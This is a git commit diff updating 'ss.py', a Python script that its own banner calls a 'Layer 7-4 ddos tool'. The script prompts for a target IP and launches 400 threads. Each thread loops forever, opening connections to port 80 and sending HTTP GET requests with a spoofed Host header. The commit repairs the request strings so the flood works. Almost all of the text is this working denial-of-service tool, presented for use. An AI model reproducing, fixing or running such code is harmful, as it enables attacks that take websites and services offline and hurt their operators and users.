a93f9ba08533b13156a31d29d9ed50bef36762ae
smer <97298115+smermc@users.noreply.github.com>
2023-02-21 15:58:08 +0330

    Update ss.py

--- ss.py
+++ ss.py
@@ -1,13 +1,13 @@
 print ('''
-	   /////    /////    /////////////
-	  CCCCC/   CCCCC/   | ss.py |/
-	 CC/      CC/       |-------------|/ 
-	 CC/      CC/       |  Layer 7-4  |/ 
-	 CC/////  CC/////   |  ddos  tool |/ 
-	  CCCCC/   CCCCC/   |_____________|/
+    /////    /////   ////////////////
+   CCCCC/   CCCCC/   |    ss.py    |/
+  CC/      CC/       |-------------|/ 
+  CC/      CC/       |  Layer 7-4  |/ 
+  CC/////  CC/////   |  ddos  tool |/ 
+   CCCCC/   CCCCC/   |_|/
 >--------------------------------------------->
 Version 1.0 (2023)
-				C0d3d by Sm3R
+    C0d3d by Sm3R
 ┌─────────────────────────────────────────────┐
 │         lotfan be .gov ddos nazanid       │
 ├─────────────────────────────────────────────┤
@@ -21,8 +21,7 @@ import threading
 
 
 
-
-target = input("Enter target ip -->")
+target = input("Enter target ip :  \n ")
 fake_ip = "40.199.23.23"
 port = 80
 
@@ -30,28 +29,30 @@ counter = 0
 
 def attack():
     while True:
-        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((target,port))
-        s.sendto(("GET /"+target+HTTP/1.1/r/n).encode("ascii"),(target,port))
-        s.sendto(("Host:"+fake_ip+"/r/n/r/n").encode("ascii"),(target,port))
-	
+        s.sendto(("GET /"+target+"HTTP/1.1\r\n").encode('ascii'), (target,port))
+        s.sendto(("Host:"+fake_ip+"\r\n\r\n").encode('ascii'),(target,port))
+ 
         global counter
         counter += 1
-        print(f"packet {str(counter)} sent ! /n")
+        print(counter)
+        
+        
         s.close()
-	
-print(" [                 ]  0% ")
+ 
+print(" [              ]  0% ")
 time.sleep(1)
-print(" [••••••         ]  20% ")
+print(" [•••••         ]  20% ")
 time.sleep(1)
-print(" [•••••••••     ]  60% ")
+print(" [••••••••      ]  60% ")
 time.sleep(1)
-print(" [•••••••••••••]  100% ")
+print(" [••••••••••••••]  100% ")
 time.sleep(1)
 print("Attack Start . . . !")
 time.sleep(1)
-	
-	
+ 
+ 
 for i in range(400):
-	thread = threading.Thread(target=attack)
-	thread.start()
+ thread = threading.Thread(target=attack)
+ thread.start()
